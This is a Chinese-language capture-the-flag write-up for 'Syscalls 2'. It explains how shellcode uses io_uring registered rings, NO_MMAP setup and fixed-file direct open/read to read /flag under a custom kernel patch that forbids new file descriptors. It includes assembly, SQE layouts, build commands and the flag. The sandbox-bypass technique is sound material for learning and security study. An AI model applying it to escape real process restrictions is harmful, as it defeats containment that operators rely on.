# Syscalls 2

## 题目简述

题目提供 Linux 6.9.6 虚拟机和一个直接执行十六进制 shellcode 的 RWX 加载器。自定义内核增加 `prctl(100)`：调用后，当前任务及子进程的普通文件描述符分配都会在 `alloc_fd` 返回 `-EPERM`，若仍走到 `fd_install` 甚至会触发 panic。现有 stdin/stdout/stderr 保留，但普通 `open("/flag")` 无法取得新 fd。提示“不是漏洞，是功能”指向 io_uring 的注册环与 fixed file 功能。

## 解题过程

补丁只拦截进程的 `files_struct` 描述符表，io_uring 自己的 registered ring index 和 fixed-file table 不属于普通 fd。完整绕过需要同时解决两个问题：`io_uring_setup` 默认也会返回 fd，且通常要通过该 fd 映射环形缓冲区。

先 `mmap` 0x2000 字节共享匿名内存，把第一页作为 SQE 区、第二页作为环元数据区，并在 `io_uring_params` 中设置：

```text
flags = IORING_SETUP_NO_MMAP | IORING_SETUP_REGISTERED_FD_ONLY
sq_off.user_addr = area
cq_off.user_addr = area + 0x1000
sq_entries = 2
```

`IORING_SETUP_NO_MMAP` 允许直接提供用户态环内存；`IORING_SETUP_REGISTERED_FD_ONLY` 让 `io_uring_setup` 返回已注册环的索引，而不是安装普通 fd。后续 `io_uring_register` 和 `io_uring_enter` 都在 opcode/flags 中加入 `IORING_REGISTER_USE_REGISTERED_RING` 或 `IORING_ENTER_REGISTERED_RING`，把第一个参数解释为该索引。

接着注册一个内容为 `-1` 的 fixed-file 槽位：

```asm
mov rax, SYS_io_uring_register
mov rdi, r12                  /* registered ring index */
mov rsi, 0x80000002           /* REGISTER_FILES | USE_REGISTERED_RING */
lea rdx, [rip + fd_arr]       /* fd_arr = {-1} */
mov r10, 1
syscall
```

准备两个 64 字节 SQE。第一个使用 `IORING_OP_OPENAT` 打开 `/flag`，`fd=-100` 表示 `AT_FDCWD`，并把 `file_index` 设为 1。该字段是 1 起始编码，因此打开结果直接安装到 fixed-file 槽 0，不创建进程 fd：

```text
SQE 0:
  opcode     = IORING_OP_OPENAT
  fd         = AT_FDCWD
  addr       = "/flag"
  open_flags = O_RDONLY | O_NONBLOCK
  file_index = 1
```

第二个 SQE 以 `IOSQE_FIXED_FILE` 标记读取槽 0，把最多 128 字节写入 shellcode 自带缓冲区：

```text
SQE 1:
  opcode = IORING_OP_READ
  flags  = IOSQE_FIXED_FILE
  fd     = 0
  addr   = buf
  len    = 128
```

把 SQ array 的前两项设为 0 和 1，并分两次调用带 `IORING_ENTER_GETEVENTS | IORING_ENTER_REGISTERED_RING` 的 `io_uring_enter`，保证先完成 direct open，再执行 fixed-file read。读取结果已经落在普通内存，最后使用现有 stdout fd 1 调用 `write` 即可，不需要创建任何新描述符。

官方 healthcheck 将 `solution.S` 编译后只提取 `.text`，再转成十六进制文本：

```bash
gcc -static -nostartfiles solution.S -o solution.o
objcopy -j .text -O binary solution.o solution.bin
xxd -p solution.bin > solution.txt
```

向加载器发送十六进制内容，再单独发送 `done`，shellcode输出：

```text
uiuctf{io-uring-never-disappoints-3a5922c1}
```

## 方法总结

- 内核补丁封锁的是普通 fd 分配路径，不是所有内核文件引用；io_uring 的 fixed-file table 提供了独立对象命名空间。
- `REGISTERED_FD_ONLY` 解决“建立 io_uring 本身也需要 fd”，`NO_MMAP` 解决“没有 ring fd 就无法常规 mmap”，direct open 再解决“打开 Flag 会创建 fd”，三项缺一不可。
- 两个 SQE 必须按完成顺序提交，读取时设置 `IOSQE_FIXED_FILE` 并使用槽索引 0。最后只通过预先存在的 stdout 输出，完整利用链始终遵守补丁对新 fd 的禁令。
